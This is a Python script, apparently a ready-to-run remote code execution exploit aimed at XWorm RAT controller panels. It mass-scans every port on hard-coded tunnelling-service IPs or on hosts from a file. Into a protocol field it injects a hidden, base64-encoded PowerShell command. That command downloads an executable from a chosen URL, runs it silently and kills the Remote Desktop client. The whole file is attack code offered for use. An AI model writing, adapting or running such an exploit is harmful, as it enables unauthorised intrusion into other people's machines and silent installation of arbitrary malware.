from concurrent.futures import ThreadPoolExecutor
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
import threading
import argparse
import hashlib
import socket
import base64
import random
import time
import os


class RceExploitUtils:
    def aes_encryptor(input_bytes, key):
        key_hash = hashlib.md5(key.encode('utf-8')).digest() # MD5 hash of the key
        cipher = AES.new(key_hash, AES.MODE_ECB) # AES cipher in ECB mode
        padded = pad(input_bytes, AES.block_size) # Pad input to block size
        return cipher.encrypt(padded) # Return encrypted bytes

    def send_encrypted(sock, text: str, key: str): 
        encrypted = RceExploitUtils.aes_encryptor(text.encode(), key) # Encrypt the text
        header = (str(len(encrypted)) + "\0").encode() # Create header with length
        sock.sendall(header + encrypted) # Send header and encrypted data

class RceExploit:
    SPL_XCLIENT = "<Xwormmm>" # Separator constant, used in all XWorm Versions as far as i know

    @staticmethod
    def main():
        parser = argparse.ArgumentParser(add_help=False)
        parser.add_argument('--h', '--host', dest='host', nargs='?', help='IP File (or "auto" when empty)') # Target hosts / auto
        parser.add_argument('--k', '--key', dest='key', nargs='?', help='Encryption key') # Encryption key
        parser.add_argument('--u', '--url', dest='url', nargs='?', help='Payload direct link') # Payload link
        parser.add_argument('--help', action='store_true', dest='help_flag', help='Show this help message and exit') # Help flag

        args, unknown = parser.parse_known_args()  # Parse known args only

        if args.help_flag:
            parser.print_help() # Show help message
            return # Exit after showing help

        host = args.host if args.host else input("IP File (Press Enter for Auto) > ") # Get target hosts, or auto (playit.gg + cloudpub.ru + portmap.io parser)
        key = args.key if args.key else input("Key > ") # Get encryption key
        url = args.url if args.url else input("Payload Direct Link > ") # Get payload direct link
        RceExploit.connection(host, key, url) # Start connection and exploit

    def connection(host, key, url):
        try:
            if host and host.strip(): # If host file is provided
                if os.path.exists(host.strip()):
                    with open(host.strip(), "r") as file: # Open the host file
                        lines = [line.strip() for line in file if line.strip() and ':' in line] # Read lines with host:port
                else:
                    print(f"File {host.strip()} does not exist.") # File not found
                    return
            else:
                lines = [] # Auto-generate host:port combinations

                playit_gg = ["147.185.221.26", "147.185.221.28", "193.161.193.99"] # Playit.gg IPs - There could be more check playit.gg (AS400519) - https://bgp.he.net/AS400519
                cloudpub_ru = ["5.182.226.142"] # Cloudpub.ru IPs - There could be more check cloudpub.ru (Unknown AS) - Down i think
                portmap_io = ["193.161.193.99"] # Portmap.io IPs - There could be more check portmap.io (AS198134)

                all_ips = playit_gg + cloudpub_ru + portmap_io # Combine all IPs

                for ip in all_ips: # resolver servers
                    for port in range(1, 65536): # All possible ports
                        lines.append(f"{ip}:{port}") # Append host:port to lines

            lock = threading.Lock() # Lock for thread-safe operations

            start_time = time.time() # Start time for duration calculation

            good = 0 # good connection
            bad = 0 # bad connection

            def handle(line): # Handle each line in a thread
                nonlocal good, bad # Access outer scope variables
                try: # Parse host and port
                    host, port = line.split(":") # Split host and port
                    port = int(port) # Convert port to integer
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create TCP socket
                    sock.settimeout(3) # Set timeout for socket
                    try:
                        sock.connect((host, port)) # Connect to target
                        print(f"Connected to {host}:{port}") # Print successful connection
                        RceExploit.trigger(url, sock, key) # Trigger the exploit
                        good += 1 # Increment good counter
                        sock.close() # Close socket
                    except Exception as e: # Handle connection errors
                        with lock: # Thread-safe print
                            sock.close() # Close socket on failure
                            #print(f"Connection to {host}:{port} failed") # Print connection failure if wanted, i leave it commented to reduce spam
                            bad += 1 # Increment bad counter
                except Exception as e: # Handle parsing errors
                    with lock: # Thread-safe print
                        print(f"Parsing error: {e}") # Print parsing error
                        bad += 1 # Increment bad counter

        except Exception as e:# Handle file reading errors
            print(f"Connection failed: {e}") # Print connection failure
            os._exit(0) # Exit on failure

        with ThreadPoolExecutor(max_workers=50) as exc: # Thread pool for concurrent connections
            exc.map(handle, lines) # Map handle function to lines 

        duration = time.time() - start_time # Calculate duration
        print("-------------------------------------------------------") # Summary
        print(f"Processed {len(lines)} lines in {duration:.2f} seconds.") # Print total lines and duration
        print(f"Successful connections: {good}") # Print successful connections
        print(f"Failed connections: {bad}") # Print failed connections


    def trigger(url, sock, key):
        try:
            payload_start = f'hrdp{RceExploit.SPL_XCLIENT}ClientID{RceExploit.SPL_XCLIENT}' 

            RceExploitUtils.send_encrypted(sock, payload_start, key) # Send encrypted message

            raw_command = (
                rf'$url = "{url}"; '
                rf'$outputPath = "$env:TEMP\{random.randint(1, 999999)}.exe"; '
                'Invoke-WebRequest -Uri $url -OutFile $outputPath; '
                'Start-Process -FilePath $outputPath -ArgumentList "/silent"; '
                'taskkill /f /IM mstsc.exe'
            ) # PowerShell command to download and execute payload
            
            encoded_command = base64.b64encode(raw_command.encode('utf-16le')).decode() # Encode command in Base64

            payload = f'hrdp+{RceExploit.SPL_XCLIENT}ClientID{RceExploit.SPL_XCLIENT}t.me/Swezy{RceExploit.SPL_XCLIENT}" & start powershell.exe -WindowStyle Hidden -EncodedCommand {encoded_command}{RceExploit.SPL_XCLIENT}0:0'

            RceExploitUtils.send_encrypted(sock, payload, key) # Send encrypted message
            print("RCE Exploit sent.")
        except Exception as e:
            print(f"Failed to send message: {e}")

if __name__ == "__main__":
    RceExploit.main() # Run the main function